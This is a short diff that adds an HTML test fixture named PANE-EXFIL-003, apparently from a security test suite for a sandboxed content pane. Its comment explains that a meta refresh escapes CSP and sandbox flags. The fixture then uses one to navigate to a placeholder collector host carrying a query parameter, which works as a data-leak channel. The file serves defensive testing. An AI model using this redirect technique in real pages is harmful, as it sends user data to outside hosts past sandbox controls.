@@ -1,0 +1,8 @@
+<!--
+  PANE-EXFIL-003. No CSP directive governs `<meta http-equiv="refresh">`, and
+  it is not gated by any sandbox flag — the reference host grants
+  `allow-scripts allow-same-origin allow-forms`, and a document navigating
+  ITSELF is not a top-level navigation.
+-->
+<meta http-equiv="refresh" content="0;url=https://collector.invalid/c?f=1">
+<p>Loading…</p>
